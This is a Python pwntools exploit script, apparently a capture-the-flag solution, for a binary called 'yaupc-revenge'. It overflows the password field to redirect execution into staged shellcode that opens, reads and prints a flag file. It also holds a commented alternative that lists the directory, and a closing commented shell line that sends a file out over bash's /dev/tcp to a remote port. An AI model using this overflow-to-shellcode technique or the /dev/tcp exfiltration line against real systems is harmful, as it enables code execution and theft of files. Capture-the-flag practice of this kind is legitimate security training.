#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./yaupc-revenge")
    if args.GDB:
        gdb.attach(r,"b *0x00000000004016b8\nc\n")
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
buf = 0x4040a0
shellcode = f'''
mov rax, 0x0
mov rdi, 0x0
mov rsi, {buf+0x100}
mov rdx, 0x400
syscall
push {buf+0x100}
ret
'''

sc = asm(shellcode)

sa("Username: ",sc)
sa("Password: ",b"A"*56+p64(buf))
# Leak flag name
# sc = b''
# sc += asm(shellcraft.open('.'))
# sc += asm(shellcraft.getdents(3, 'rsp', 0x500))
# sc += asm(shellcraft.write(1, 'rsp', 0x500))
# Leak flag content
sc = b''
sc += asm(shellcraft.open("./flag_34a611c6f7934545f1f0c13a61ee2eea"))
sc += asm(shellcraft.read('rax', "rsp", 0x500))
sc += asm(shellcraft.write(1, "rsp", 0x500))
sa("again.\n",sc)
r.interactive()

'''
Writeup:
'''


'''
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''